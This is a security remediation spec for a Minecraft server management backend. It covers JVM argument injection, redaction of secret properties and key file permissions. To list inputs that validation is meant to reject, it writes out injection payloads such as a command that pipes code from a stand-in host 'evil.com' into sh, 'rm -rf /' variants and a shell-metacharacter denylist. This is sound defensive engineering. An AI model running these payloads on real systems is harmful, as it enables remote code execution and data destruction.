# SPEC-2026-10-05-SECURITY-BATCH-S1-01 — Security Batch S1, Revision 1.1

Status: Implemented in working tree 2026-10-06 (uncommitted; verification: backend 3228 passed / 6 skipped sequential, frontend 767, 6/6 gates)
Revision: 1.1 (supersedes in-prompt v1.0, which was never saved to disk; see Change Log §13) + §6.1/§13 amendment 2026-10-06 (poisoned-row 422 surface + DB-surgery repair, verified live)
Lane: Release Critical track (Release Critical — confirmed security vulnerability fixes)
Decision level: D1 (multi-module bug fix within established architecture; no `permissions.yaml` change)
Date: 2026-10-05

Subsystems: JVM Argument Injection Remediation (S1.1), `raw_properties` Secret Redaction (S1.2),
Key File Permission Hardening (S1.3)

Target components:

- `backend/app/modules/server/domain/value_objects.py`
- `backend/app/modules/server/infrastructure/providers/local.py`
- `backend/app/modules/server/infrastructure/providers/remote.py`
- `backend/app/modules/server/application/read_models.py`
- `backend/app/modules/server/application/commands/update_server_config.py`
- `backend/app/core/security_files.py` ([NEW] — path + signature in §4)
- `backend/app/core/exceptions.py` (one new class)
- `backend/app/core/config.py` (one new `AppSettings` field)
- `backend/app/modules/auth/infrastructure/jwt.py`
- `backend/app/modules/storage/encryption.py`
- `frontend/src/server_manager/components/ServerSettingsSection.tsx` (validation alignment only)

Evidence convention: every cited identifier was re-verified this session (2026-10-05) via
grep/read and carries a `file:line`. Statements are labeled FACT / ASSUMPTION / UNKNOWN /
CONFLICT. Identifiers that do not exist yet are marked [NEW] with path + signature
(RULE ZERO). No code was modified to produce this spec.

---

## 1. Goal

Eliminate three verified security vulnerabilities without altering permission contracts
and without breaking legitimate Minecraft server operations:

1. **S1.1 JVM Argument Injection (INCOMPLETE FIX of ISS-010):** prevent shell command
   injection via `java_args` / `jvm_flags`, `java_executable`, and `startup_command`
   tokens across server creation, update, stored-configuration reload, and provider
   execution pipelines (`local.py`, `remote.py`).
2. **S1.2 `raw_properties` Secret Redaction:** eliminate plain-text disclosure of
   sensitive configuration keys via `ServerDetailReadModel` /
   `ServerDetailResponse.raw_properties`, and guarantee redaction can never cause a
   settings save to clobber real on-disk secrets.
3. **S1.3 Key File Permission Hardening:** enforce `0o600` on existing and newly
   generated cryptographic key files (`jwt_private_key.pem`,
   `backup_encryption_key.bin`) on POSIX during application startup, with loud
   failure and explicit platform handling.

Recorded owner decisions (fixed; not questions — see §12):

- **D-S1-KEYS:** An un-tightenable key file on POSIX refuses startup
  (`SecurityPermissionError`), with an explicit opt-out via a NEW `AppSettings`
  field (not a raw `os.environ` read).
- **D-S1-STORED-ARGS:** A stored unsafe `java_args` on start is rejected with a
  clear error; never sanitized silently.
- **D-S1-PROPS-NOTE:** The `server.properties` download behavior and its
  `permissions.yaml` note are unchanged in this batch (keep behavior + existing
  test green; note corrected in a later D2 pass).

---

## 2. Current Behavior

### S1.1 JVM Argument Injection

- FACT: `JavaArguments.__init__` performs prefix-only validation
  (`backend/app/modules/server/domain/value_objects.py:93-98`):
  `if not arg.startswith("-"): raise ValueError(...)`. Payloads such as
  `-Xmx2G; curl evil.com | sh`, `-Xmx1G$(whoami)`, and ``-Xmx1G`id` `` pass because
  they start with `-`. (Typo in v1.0, `-Xmx1Gid```, corrected here.)
- FACT: `LaunchConfiguration` validates `startup_command` for type/emptiness only
  (`value_objects.py:213-238`) and does not validate `java_executable`
  (default `"java"`) or `jvm_flags` (`value_objects.py:207-212, 243-246`).
- FACT: legacy `cfg` path joins flags unquoted (`local.py:213-214`, `local.py:238-241`):
  `jvm_flags = " ".join(java_args) ...` then
  `f"cd {shlex.quote(server_dir)} && {java_exec} {jvm_flags} ..."`.
- FACT: launch_config path joins without quoting and leaves `cd` unquoted
  (`local.py:205-207`): `cmd = " ".join(cmd_list)` then `cmd = f"cd {server_dir} && {cmd}"`.
- FACT: two-stage shell evaluation. `local.py:297-299`:
  `f"tmux new-session -d -s {shlex.quote(session_name)} {shlex.quote(cmd)}"`,
  executed via `asyncio.create_subprocess_shell` (`local.py:594-600`).
  The outer shell strips one quote layer; tmux's pane shell (`$SHELL -c`) then
  evaluates the inner command, where unquoted `jvm_flags` metacharacters execute.
- FACT: `remote.py:70,78-84` has the identical hole
  (`f"cd {shlex.quote(server_dir)} && java {jvm_args} ..."` over SSH `conn.run`).
- FACT: `docker.py:194-198` builds `["java", *flags, ...]` and executes via
  tokenized `asyncio.create_subprocess_exec("docker", *args)` (`docker.py:970-981`).
  Docker execution is safe from this vector.
- FACT: `local_windows.py` passes an argv list to `subprocess.Popen` with no
  `shell=True` (`local_windows.py:297-302`, "explicitly pass cmd_args as a list
  without shell=True"). No shell interpolation occurs there, so it needs **no
  quoting change**; domain-level validation (§3 S1.1) still covers its inputs.
- FACT: neither `local.py` nor `remote.py` references `deployment.startup_command`
  (verified by grep — zero hits). The `str`-form deployment field
  (`filesystem_reconciliation.py:1048-1052`) is consumed only by the tokenized
  docker path (`docker.py:426-430`). Shell-join risk for `startup_command` lives
  solely in the `local.py:205-207` launch_config join.
- FACT: `startup_command` sources are fixed literals, not attacker strings:
  `_detect_launch_script` returns only `["bash", run_sh, "nogui"]` /
  `[run_bat, "nogui"]` with constant names (`installer_provisioner.py:108-130`);
  `scan_server_directory` reports `run_script` only from the literals
  `"run.sh"`/`"run.bat"` (`import_service.py:279-283`); reconciliation embeds
  `["bash", run_script or "run.sh", "nogui"]` (`filesystem_reconciliation.py:1104`).
  No API schema accepts `startup_command`
  (`ServerCreateRequest`/`ServerUpdateRequest` expose only `java_args: list[str] |
  None`; `server.py:37,53`; `startup_command` at `server.py:103` is response-only).
  Attacker influence on `startup_command` requires DB tampering or legacy rows
  (`repository.py:166-183` rehydrates `LaunchConfiguration` from
  `launch_config_json`, splitting stored strings on whitespace at `:173`).
- FACT: `java_executable` likewise has no API schema field; it arrives via stored
  `launch_config_json` (`repository.py:177`) and internal construction.
- CONFLICT (new, found during v1.1 verification): v1.0's strict allowlist
  (no whitespace, no quotes) contradicts ISS-009, pinned by
  `test_save_and_reload_complex_jvm_args` (`backend/tests/infrastructure/
  test_repositories.py:95-117`): `'-Dproperty="hello world"'`,
  `'-XX:OnOutOfMemoryError="kill -9 %p"'`, and `'-Dcustom.msg=welcome to minecraft'`
  must round-trip faithfully. Any grammar rejecting spaces/quotes breaks this test
  and real OOM-hook usage. §3 S1.1 resolves this by switching from allowlist to
  quote-primary + metacharacter-denylist (spaces, quotes, `%` explicitly allowed).
- FACT: Windows paths with spaces must keep working:
  `test_windows_path_with_spaces_and_backslashes_character_preservation`
  (`backend/tests/domain/test_value_objects.py:313-326`) pins
  `C:\Program Files\Java\jdk-21\bin\java.exe`; `test_local_windows_provider.py:331`
  uses `C:\Program Files\Java\bin\java.exe`. `java_executable` validation must
  therefore allow spaces/backslashes (single path token, quoted at use).
- FACT: error mapping today — `JavaArguments` raises `ValueError`, which
  `CommandBus.send` funnels to `CommandResult(error_code="UNEXPECTED_ERROR")`
  (`backend/app/core/command_bus.py:107-120`) → HTTP **500** via
  `check_command_result` (`backend/app/api/errors.py:50-60`). After S1.1 raises
  `InvalidValueError` (`exceptions.py:43`, `code="VALIDATION_ERROR"`), the same
  path maps to HTTP **422** (`errors.py:23-47` map; `errors.py:112-120`
  handler). The 500→422 change on invalid `java_args` is an intended behavior
  fix, stated here so it is not filed as a regression.
- FACT: stored-unsafe start raises `ProviderError`, which extends
  `InfrastructureError` (`exceptions.py:182` ← `:159`) → HTTP **503**
  (`errors.py:158-162`). v1.0 §6 wrongly claimed 400/422; §6 below is corrected.

### S1.2 `raw_properties` Secret Redaction

- FACT: `_read_raw_properties` returns every `k=v` line verbatim
  (`read_models.py:40-58`); `ServerDetailReadModel.from_domain` assigns it
  unchanged (`read_models.py:230`); `ServerDetailResponse.raw_properties` exposes
  it (`server.py:86`) over `GET /api/v1/servers/{server_id}`
  (`servers.py:284-290`, auth-only). Any authenticated viewer reads `rcon.password`.
- FACT: the frontend clobber path is real (`ServerSettingsSection.tsx:244-254`
  collects unknown keys into `customProperties`; `handleSave` (`:286-325`)
  re-sends them at `:323`). Masked-placeholder echo would overwrite disk secrets.
- FACT: `rcon.password` is not a known settings key — zero `rcon` hits in
  `ServerSettingsSection.tsx` (`KNOWN_PROPERTY_KEYS`, `:55`, covers only display
  fields). Omission therefore removes the secret from `customProperties` cleanly.
- FACT: `update_properties` ignores unknown keys (`aggregate.py:468-471`),
  so secret keys reach disk **only** through the direct
  `update_server_properties_key` loop (`update_server_config.py:103-108`, inside
  a blanket `except Exception: pass` at `:109-110`). Write-protection targets
  exactly that loop. Note the key-mapping subtlety: `file_key =
  _PROP_KEY_MAP.get(k, k.replace("_", "-"))` (`:105`), so a `rcon_password`
  input would address `rcon-password`, not on-disk `rcon.password` — the §3
  normalizer strips all three delimiters, matching both forms.
- CONFLICT (unchanged from v1.0, still out of scope): `permissions.yaml:227,231`
  notes claim `server.properties` read/download is "denied for all", but
  `SENSITIVE_FILENAMES` holds only `.env` (`files.py:20-32`) and
  `test_batch7_second_pass.py:471-475` asserts download of `server.properties`
  returns 200. Per D-S1-PROPS-NOTE, behavior + test stay; the note is fixed in a
  later D2 pass (§8.9).

### S1.3 Key File Permissions

- FACT: `jwt.py:84` and `encryption.py:51` chmod `0o600` only the creation-tempfile
  inside `with contextlib.suppress(OSError)`; existing-file loads
  (`jwt.py:42-58`, `encryption.py:26-39`) never check permissions.
  Key path resolution: `jwt.py:29` single default; `encryption.py:26-30`
  two-candidate list.
- FACT: lifespan calls both initializers (`main.py:87`
  `init_jwt_from_settings(settings)`; `main.py:93` `init_storage(settings)` →
  `build_backup_encryption`), so a raise refuses startup — the fail-fast
  mechanism D-S1-KEYS relies on.
- FACT: `AppSettings` uses `ONX_` primary / `MCS_` legacy env prefixes
  (`config.py:65-80`, `extra="ignore"`); no `allow_insecure_keys` field exists
  today (verified by grep — zero `allow_insecure` hits).

---

## 3. Proposed Change

### S1.1 JVM Argument and Launch Configuration Hardening

#### 1. Domain token grammar (denylist behind quoting — resolves ISS-009 conflict)

Rationale (design constraint, new in v1.1): per-token `shlex.quote` at command
construction (§3.1.2) is the **primary** control — it neutralizes every character
and preserves ISS-009 multi-word args as single argv elements (which the current
unquoted join actually splits, i.e. quoting *fixes* their runtime semantics).
Validation is defense-in-depth: it rejects statement/substitution metacharacters
so that even a future quoting regression cannot yield execution. Whitespace,
quotes, and `%` are therefore **allowed** (evidence: `test_repositories.py:95-117`
requires them; `%p`/`%t` are canonical JVM log/OOM patterns).

[NEW] helper in `backend/app/modules/server/domain/value_objects.py`:

```python
_REJECTED_SHELL_CHARS: frozenset[str] = frozenset("`$;|&<>()!{}")

def _reject_shell_metachars(value: str, field: str) -> None: ...
```

- `JavaArguments.__init__`: each element must (1) start with `-`, (2) be
  ≤ 1024 chars, (3) contain no char in `_REJECTED_SHELL_CHARS` and no
  `\n`, `\r`, `\0`. Violation raises `InvalidValueError(field="java_args", ...)`
  (`exceptions.py:43`; domain import is layering-consistent — precedent
  `aggregate.py:8`). Rejected examples: `-Xmx1G;curl evil|sh`, `-Xmx1G$(id)`,
  ``-Xmx1G`id` ``, `-Xmx1G\nrm -rf /`, `-Xmx1G & calc`, `-Xmx1G"&&id` (the `&`
  and `"` … `"` structure still contains rejected `&`; quotes alone are fine).
  Accepted: `-Xmx4G`, `-XX:+UseG1GC`, `-Dterminal.jline=false`,
  `--add-opens=java.base/java.lang=ALL-UNNAMED`, `-javaagent:/opt/agents/jmx.jar`,
  `-Xlog:gc*:file=logs/gc.log:time,uptime:filecount=5,filesize=10M`,
  `-XX:OnOutOfMemoryError="kill -9 %p"`, `-Dcustom.msg=welcome to minecraft`.
- `LaunchConfiguration.__post_init__`: (a) `java_executable` must be a non-empty
  string ≤ 1024 chars satisfying `_reject_shell_metachars` (spaces, `\`, `/`,
  `:`, `.` allowed — Windows paths keep working per `test_value_objects.py:313-326`)
  **and** containing no `..` segment (split on `/` and `\`); (b) every
  `startup_command` element and every `jvm_flags` element satisfies
  `_reject_shell_metachars` (no leading-`-` rule for `startup_command`;
  evidence shows only `bash`/`run.sh`/`cmd.exe` literals in tests at
  `test_value_objects.py:304-311`). Violations raise
  `InvalidValueError(field="java_executable" | "startup_command" | "jvm_flags")`.
  The v1.0 "traversal anomalies" claim is hereby given teeth instead of removed.
- Exposure statement (review item 4): no API schema sets `java_executable` or
  `startup_command`; both arrive via `launch_config_json` DB round-trip
  (`repository.py:166-183`) and internal construction. Validation in the
  constructors therefore covers every path, including legacy rows.
- `repository.py:184` interaction (explicit): the existing
  `except (json.JSONDecodeError, TypeError, KeyError, ValueError)` must **not**
  be widened — `InvalidValueError` is not a `ValueError`, so poisoned rows
  propagate loudly instead of being silently dropped to `launch_config=None`
  (which would be sanitize-by-omission, violating D-S1-STORED-ARGS). Poisoned
   rows fail reads loudly too (list-wide 422); repair is direct DB surgery
   (`UPDATE servers SET java_args = '' ...`, `SET launch_config_json = NULL ...`
   — `PATCH` cannot reach a poisoned row since handlers load via `repo.get`
   first; amended 2026-10-06), or a direct DB edit. Documented in §6.1.

#### 2. Defense-in-depth command construction (unchanged from v1.0, now the primary control)

In `LocalLinuxProvider` and `RemoteProvider`, build the inner JVM invocation
exclusively from individually quoted tokens:

1. tokens = `[java_exec, *jvm_args, "-Xms{m}M", "-Xmx{m}M", ...,
   "-jar", jar_name, "nogui"]`;
2. `inner_cmd = " ".join(shlex.quote(t) for t in tokens)`;
3. `pane_cmd = f"cd {shlex.quote(server_dir)} && exec {inner_cmd}"`;
4. tmux: `f"tmux new-session -d -s {shlex.quote(session_name)}
   {shlex.quote(pane_cmd)}"`.

`exec` delta (review item 6): the pane shell replaces itself with the JVM, so
the tmux pane PID **is** the JVM PID. This improves `_resolve_server_pid`
fidelity but changes long-standing behavior; §7 adds a PID-resolution
regression test. No `local_windows.py` change (argv `Popen`, no shell —
`local_windows.py:297-302`); no `docker.py` change (tokenized exec —
`docker.py:970-981`). Disk-derived jar filenames (`_find_server_jar` globs any
`*.jar`, `import_service.py:117-140`) are single path tokens neutralized by the
per-token quoting — no grammar needed for them.

#### 3. Already-stored unsafe configurations (per D-S1-STORED-ARGS)

`LocalLinuxProvider.start` and `RemoteProvider.start` re-instantiate
`JavaArguments(cfg.get("java_args"))` and validate `java_executable` /
`startup_command` tokens before composing any command. On failure: log an audit
warning, abort before any subprocess/shell spawns, raise
`ProviderError("local"|"ssh", "start", f"Invalid JVM argument in stored
configuration: {arg}")` (`exceptions.py:182`) → HTTP **503**
(`errors.py:158-162`; retryable). Never filter-and-run.

### S1.2 `raw_properties` Secret Redaction

#### 1. Redaction policy — omission under ONE canonical rule (review item 1)

[NEW] single helper in `backend/app/modules/server/application/read_models.py`:

```python
import re
_SECRET_KEY_STEMS: tuple[str, ...] = ("password", "secret", "token", "apikey")
_DELIM_RE = re.compile(r"[._\-]")

def _normalize_property_key(key: str) -> str:
    """Lowercase, strip all . _ - delimiters: 'rcon.password' -> 'rconpassword'."""
    return _DELIM_RE.sub("", key.strip().lower())

def is_secret_property_key(key: str) -> bool:
    """Canonical secret test. No second regex, no bare 'key' suffix."""
    norm = _normalize_property_key(key)
    return norm in _SECRET_KEY_STEMS or norm.endswith(_SECRET_KEY_STEMS)
```

v1.0's two competing rules are deleted: the delimiter-anchored regex missed
camelCase (`serverPassword`) and `api-key`, while the bare "ends with key"
suffix false-positived (`monkey`). Consequences, pinned by tests: redacted —
`rcon.password`, `RCON_PASSWORD`, `serverPassword`, `api-key`, `my-token`;
visible — `monkey`, `turkey`, `level-seed`, `query.port`, `motd`, `whitelist`.
(`secretkey` stays visible — accepted consequence of dropping the bare-`key`
suffix; recorded, not hidden.)

- `_read_raw_properties` (`read_models.py:40-58`) omits lines where
  `is_secret_property_key(key)`. Omission (not masking) is retained: masking
  would flow through `customProperties` (`ServerSettingsSection.tsx:244-254`)
  into `handleSave` (`:286-325`) and clobber disk secrets.
- Placement justification (verification a): `_read_raw_properties` has exactly
  one caller, `ServerDetailReadModel.from_domain` (`read_models.py:230`), whose
  only consumer is `GetServerHandler` (`queries/get_server.py:16,37`) → the
  detail route. All RCON/password consumers read independently from disk/env
  (`collector.py:455`, `docker.py:505,593`, `jar_service.py:1078`,
  `config_writer.py:58`, `test_runner.py:609-615` — zero consume the read
  model). Redaction at the read layer therefore cannot break RCON, health, or
  metrics. No shared-reader relocation needed.

#### 2. Write-path protection + explicit function loss (review item 2)

In `UpdateServerConfigHandler.handle`, before the disk loop
(`update_server_config.py:103-108`): skip any entry whose `file_key`
`is_secret_property_key(file_key)` (covers both `rcon.password` and the
`rcon_password`→`rcon-password` mapped form via delimiter-stripping), log an
informational warning. **All** secret-key writes via PATCH are dropped — real
values, placeholders, and empties alike. Stated consequences (no longer
implicit): after S1.2, `rcon.password` **cannot be viewed, set, or cleared**
through Server Settings or `PATCH properties`; rotation happens exclusively
through the Files surface (`PUT .../files/content` by `server.{id}.files`
holders — preserved behavior). Residual risk, stated plainly: `server.properties`
remains downloadable by files/view holders (`test_batch7:471-475` stays green);
S1 narrows exposure from "any authenticated viewer" to "files-granted users".

### S1.3 Key File Permission Hardening (per D-S1-KEYS)

[NEW] `backend/app/core/security_files.py`:

```python
from pathlib import Path
def ensure_private_key_permissions(path: Path | str) -> None: ...
```

- POSIX (`os.name == "posix"`): read `st_mode & 0o777`; "too open" test is
  `(mode & 0o077) != 0` (review nit — `0400` files are left alone, unlike v1.0's
  exact-`0o600` comparison). Otherwise `os.chmod(path, 0o600)` and re-check;
  persistent failure → log CRITICAL
  (`"Insecure file permissions on key file %s (mode %o, expected 0600)"`) and
  raise [NEW] `SecurityPermissionError(InfrastructureError)` (home:
  `backend/app/core/exceptions.py`, next to `InfrastructureError` at `:159`).
  It propagates through `lifespan` **unmapped** (`main.py:87,93` run before
  router/middleware error handling applies to startup) → the backend refuses to
  start. Override: [NEW] `AppSettings.allow_insecure_keys: bool = False`
  (`backend/app/core/config.py`, beside `secret_key` at `:29`; `ONX_` primary /
  `MCS_` legacy env via `settings_customise_sources`, `config.py:65-80`) — when
  true, log CRITICAL and proceed.
- Windows (`os.name == "nt"`): log INFO skip (POSIX modes inapplicable), return.
- Call sites: `init_jwt_from_settings` — ensure **before** reading an existing
  key file (`jwt.py:42-58` load branches) and on the creation tempfile
  (replacing the `contextlib.suppress(OSError)` chmod at `jwt.py:84`);
  `load_or_create_backup_key` — ensure on existing-file load
  (`encryption.py:26-39`) and on the creation tempfile (replacing
  `encryption.py:51`). (`mkstemp` already yields `0600`; the ensure call is
  belt-and-braces plus the existing-file tightening that ISS-041/024 missed.)

---

## 4. Affected Components

| File / Component | Type | Responsibility in S1 (rev 1.1 changes vs v1.0) |
|---|---|---|
| `value_objects.py` | Existing | Denylist token grammar (`_reject_shell_metachars` [NEW]) for `JavaArguments`, `java_executable` (+ `..` rejection), `startup_command`/`jvm_flags`; `InvalidValueError` (500→422 consequence stated). v1.0 allowlist removed (ISS-009 conflict). |
| `local.py` | Existing | Per-token `shlex.quote` + `exec` pane command (both start paths); stored-config revalidation → `ProviderError`/503. |
| `remote.py` | Existing | Same per-token quoting; stored-config revalidation → `ProviderError`/503. |
| `local_windows.py` | Existing | **No change** — argv `Popen` without shell (`:297-302`); covered by domain validation. One-sentence scoping (review item 3). |
| `read_models.py` | Existing | `is_secret_property_key` + normalizer [NEW]; omission in `_read_raw_properties`. |
| `update_server_config.py` | Existing | Drop ALL secret-key writes pre-disk-loop (not just placeholders); PATCH `java_args` path confirmed validated (`:93-94`). Affected table now lists it for both secrets and `java_args` (review verification d). |
| `security_files.py` | [NEW] `ensure_private_key_permissions(path: Path \| str) -> None` | POSIX tighten-or-raise, Windows skip. |
| `exceptions.py` | Existing +1 | [NEW] `class SecurityPermissionError(InfrastructureError)` — fail-fast startup signal. |
| `config.py` | Existing +1 | [NEW] `AppSettings.allow_insecure_keys: bool = False` (ONX_/MCS_ env). |
| `jwt.py` / `encryption.py` | Existing | `ensure_*` on load + create paths; remove swallowed chmods (`:84`, `:51`). |
| `ServerSettingsSection.tsx` | Existing (task) | Align `jvmFlagsValid` (`:268-271`, prefix-only today) with §3.1 denylist or soften to warning; no redaction UI work needed (`rcon` absent by grep). |

---

## 5. Interfaces & Contracts

- `POST /api/v1/servers` (`servers.py:104-128`, `server:create`): invalid
  `java_args` → `InvalidValueError` → `CommandResult(VALIDATION_ERROR)` →
  HTTP **422** (was 500 for the same input — intended fix, §2 S1.1).
- `PATCH /api/v1/servers/{server_id}` (`servers.py:294-309`, `server:write`):
  invalid `java_args` → 422; secret-bearing `properties` entries are dropped
  (never written, never cleared); non-secret behavior unchanged.
- `GET /api/v1/servers/{server_id}` (`servers.py:284-290`): `raw_properties`
  omits secret keys entirely; secrets can no longer be viewed, set, or cleared
  via this surface (rotation via Files surface).
- Stored-unsafe start (`POST .../start` on a poisoned row): `ProviderError` →
  HTTP **503** retryable (corrected from v1.0's 400/422).
- Startup refusal (S1.3 strict path): process exits during `lifespan`; no HTTP
  contract involved. Bypass: `ONX_ALLOW_INSECURE_KEYS=1` (CRITICAL log retained).
- **Zero changes to `permissions.yaml`.** No route guard added, removed, or
  altered; the stale `server.properties` notes (`:227,231`) are untouched per
  D-S1-PROPS-NOTE.

---

## 6. Failure & Edge Cases

1. **Already-stored malicious configuration (amended 2026-10-06 — independent
   verification round):** domain constructors validate, so a poisoned row fails
   loudly on **every read path that hydrates it**: `GET /servers` (the whole
   list 422s — one bad row fails the entire listing), `GET /servers/{id}` → 422,
   `PATCH /servers/{id}` → 422 *even with valid new args* (the handler loads
   via `repo.get` first), `POST /servers/{id}/start` → 422 at load, before any
   provider runs. All carry `code: VALIDATION_ERROR` with field-level detail
   (proven live against a temp DB, 2026-10-06). The `ProviderError` → HTTP 503
   path (`errors.py:158-162`) applies only to direct-cfg callers, not to
   domain-hydrated rows. **Repair is direct DB surgery only** (`PATCH` cannot
   reach a poisoned row):
   `UPDATE servers SET java_args = '' WHERE id = '<id>';`
   `UPDATE servers SET launch_config_json = NULL WHERE id = '<id>';`
   (`java_args` is `NOT NULL`, so `''` — not `NULL` — is the correct reset;
   `launch_config_json` is nullable; both proven: row hydrates, list returns
   2/2 afterwards). `repository.py:184` re-raises `InvalidValueError` before the
   generic fallback (implemented) — silent `launch_config=None` fallback would
   be sanitize-by-omission against D-S1-STORED-ARGS.
2. **GUI settings save:** omitted secrets never enter `customProperties`
   (`ServerSettingsSection.tsx:244-254`); saves leave disk secrets untouched;
   secret placeholder values can never be written (§3 S1.2.2 drops all secret
   writes, not just masks).
3. **Read-only / shared key filesystem (incl. Windows-host bind mounts):**
   POSIX tighten failure → CRITICAL log + `SecurityPermissionError` unless
   `allow_insecure_keys` is set. First boot after S1 on normal volumes succeeds
   (owner-writable files tighten cleanly); only exotic mounts hit refusal.
4. **Legitimate complex JVM arguments (ISS-009 pinned):**
   `-XX:OnOutOfMemoryError="kill -9 %p"`, `-Dproperty="hello world"`,
   `-Dcustom.msg=welcome to minecraft`, `-Xlog:...:filecount=5,filesize=10M`,
   `--add-opens=...`, `-javaagent:...`, Windows `C:\Program Files\...` executable
   paths — all accepted; per-token quoting additionally fixes their argv
   fidelity versus today's splitting join.
5. **Memory/CPU/port interpolation (verification c):** create-schema ints carry
   `ge` bounds (`server.py:23-25`); update-schema ints are unbounded
   (`server.py:49-51`) but pydantic `int` typing makes shell metachars
   unrepresentable (non-numeric → 422 from FastAPI itself); negatives yield JVM
   errors, not injection. The sole string reaching shell is `cpu_affinity`,
   gated by `CpuAllocation.validate` (`local.py:155`) and quoted at use
   (`local.py:253`: `taskset -c {shlex.quote(cpu_affinity)}`). No change needed;
   one formatting test pins `-Xms<N>M` digit-only interpolation (§7.2).
6. **Import/scan path (verification b):** script identities are fixed literals
   end-to-end (scan `:279-283`, provisioner `:108-130`, reconciliation `:1104`);
   imported scripts execute as the server's own `run.sh` under bash — operator
   trust equivalent to the server itself, not a parameter vector. Disk-derived
   jar filenames (`import_service.py:117-140`, any `*.jar`) are covered as
   quoted single tokens. No residual attacker string reaches
   `create_subprocess_shell` after S1 beyond already-privileged file authorship.

---

## 7. Tests & Verification

Repo hygiene (applies to all below): DB-touching tests construct SQLite paths
via `tmp_path` (stray-SQLite gate); no new Ruff baseline entries
(`scripts/check-ruff-baseline`); files marked **(new file)** do not exist yet
(verified 2026-10-05).

1. Value-object unit tests (`backend/tests/domain/test_value_objects.py`
   — exists):
   - `test_java_arguments_accepts_legitimate_flags`: ISS-009 vectors
     (`-XX:OnOutOfMemoryError="kill -9 %p"`, `-Dproperty="hello world"`,
     `-Dcustom.msg=welcome to minecraft`), `%`-patterns (`gc-%t.log`),
     `--add-opens=...`, `-javaagent:...`, `-Xlog:...` — all accepted.
   - `test_java_arguments_rejects_shell_metacharacters`: parameterized —
     `-Xmx1G;curl evil|sh`, `-Xmx1G$(id)`, ``-Xmx1G`id` ``, `-Xmx1G\nrm -rf /`,
     `-Xmx1G & calc`, `-Xmx1G"&&id`, `-Xmx1G'||id`, `-Xmx1G>out`, `-Xmx1G<a`
     → `InvalidValueError` (field `java_args`).
   - `test_launch_configuration_validates_executable`: `java; rm -rf /`,
     `sh -c evil`, `../../bin/evil`, `""` → `InvalidValueError` (field
     `java_executable`); `C:\Program Files\Java\bin\java.exe` accepted
     (extends `test_value_objects.py:313-326`).
   - `test_startup_command_rejects_metacharacters`: `["bash", "run.sh;evil",
     "nogui"]` → `InvalidValueError`; existing literal tests (`:304-311`)
     stay green.
2. Provider quoting & execution tests
   (`backend/tests/infrastructure/test_providers.py` — exists):
   - `test_local_provider_start_quotes_all_jvm_args`: ISS-009-style args with
     spaces/quotes in `start()`; captured tmux string contains individually
     quoted tokens; memory flags match `-Xms<N>M` digit-only.
   - `test_local_provider_start_rejects_stored_unsafe_args`: config with
     `-Xmx1G;calc` → `ProviderError` before `_run_command` is called.
   - `test_local_provider_start_exec_prefix_and_pid_resolution` (review item 6):
     mocked `_run_command→0`, `_get_tmux_pid→pid`; assert `exec ` present,
     start returns the pid, and `stop()` issues the quoted kill-session.
   - `test_remote_provider_start_quotes_all_jvm_args`: same over mock SSH.
3. Redaction tests (`backend/tests/api/test_servers.py` — **(new file)**):
   - `test_get_server_detail_omits_secret_keys`: seed `rcon.password`,
     `serverPassword`, `api-key` + `difficulty`, `motd`, `monkey`, `turkey`,
     `level-seed`, `query.port`; assert the latter five present, the former
     three absent.
   - `test_update_server_does_not_clobber_omitted_secrets`: PATCH motd only →
     disk `rcon.password` preserved.
   - `test_update_server_drops_secret_writes`: PATCH
     `{"rcon.password": "********"}` and `{"rcon.password": "new-real-value"}`
     → disk secret unchanged in both cases.
   - Existing frontend fixture note: `ServerSettingsSection.test.tsx:45`
     seeds `raw_properties` — implementers confirm it contains no secret keys
     (else expectations change under omission).
4. Key-permission tests (`backend/tests/core/test_key_permissions.py` —
   **(new file)**):
   - `test_startup_tightens_existing_0644_key_file` (tmp_path file, POSIX):
     `0644` → `0600`.
   - `test_startup_leaves_0400_key_file_alone`: `(mode & 0o077)` rule.
   - `test_startup_skips_on_windows`: mock `os.name == "nt"` → clean return.
   - `test_startup_raises_and_bypass_flag`: chmod-failure → CRITICAL +
     `SecurityPermissionError`; with `allow_insecure_keys=True` → proceeds
     with CRITICAL log.
5. Frontend task: align `jvmFlagsValid` (`ServerSettingsSection.tsx:268-271`)
   with the §3.1 denylist (same reject message as the 422 reason) or soften to
   a non-blocking warning — implementer choice, recorded here so the UX gap
   (backend rejects what the UI accepts) is not shipped silently.

---

## 8. Out of Scope

The following items were identified during reconnaissance or discussion and are
strictly OUT OF SCOPE for Security Batch S1 (identical to v1.0):

1. Per-server authorization on `GET /api/v1/servers`, `GET /api/v1/servers/{id}`,
   `/health/*`, `/backups/*`, `/schedules/*`, and `/monitoring/alerts`.
2. WebSocket per-server authorization parity and token query-string removal.
3. SQLite `PRAGMA foreign_keys = ON` enablement and orphan record remediation.
4. `RuntimeSupervisor.start_for` race conditions and blocking
   `subprocess.run(["tmux", ...])` calls in `_cleanup_os_resources`.
5. Rate limiting reverse-proxy `X-Forwarded-For` header handling and direct
   `:8000` port exposure.
6. CORS origin configuration wiring from `AppSettings`.
7. JWT revocation / active status checking for bearer tokens on every request.
8. Frontend `localStorage` token storage migration to httpOnly cookies and Nginx
   CSP/HSTS header configuration.
9. Modifying `SENSITIVE_FILENAMES` or altering the permissions contract for
   `GET /api/v1/servers/{id}/files/download`.

---

## 9. Governance Gate Result

- Lane: Release Critical track (Release Critical) — project governance standardsauto-classification of
  confirmed security bugs. No scheduling decision is made here.
- Decision level: D1 (Standard, §4 — multi-module fix affecting user behavior
  and release capacity; record required, this file). Not D2: no architecture,
  contract, migration, or scope change (`permissions.yaml` untouched; the only
  contract-adjacent notes are deferred to a future D2 per D-S1-PROPS-NOTE).
  The fail-fast startup + new settings field are the nearest-to-D2 elements and
  are covered by recorded owner decisions D-S1-KEYS / D-S1-STORED-ARGS (§12),
  not by implementer discretion.

---

## 10. Real CI Quality Gates

Per `scripts/`, all 6 canonical CI quality gates must pass before promotion
(`testing-and-verification.md`; canonical list — "5 gates" claims are stale):

1. `scripts/check-db-revision`, 2. `scripts/check-ruff-baseline`,
3. `scripts/check-version-propagation`, 4. `scripts/check-route-contract`
   (unaffected — no route/permission change),
5. `scripts/check-ps1-bom`, 6. `scripts/check-stray-db` (new tests use
   `tmp_path`).

---

## 11. UNKNOWN Items

1. UNKNOWN: Whether any production deployment bind-mounts key files from
   Windows hosts or read-only filesystems where POSIX chmod raises EPERM
   despite the (correct) in-container `posix` check — first boot after S1
   exercises this; D-S1-KEYS bypass exists if it fires.
2. UNKNOWN: Whether third-party modpacks store secrets in `server.properties`
   under names matching neither the stems nor the suffix rule (e.g.
   `secretkey`, single-word custom names) — accepted residual; the Files
   surface remains the backstop for unusual keys.
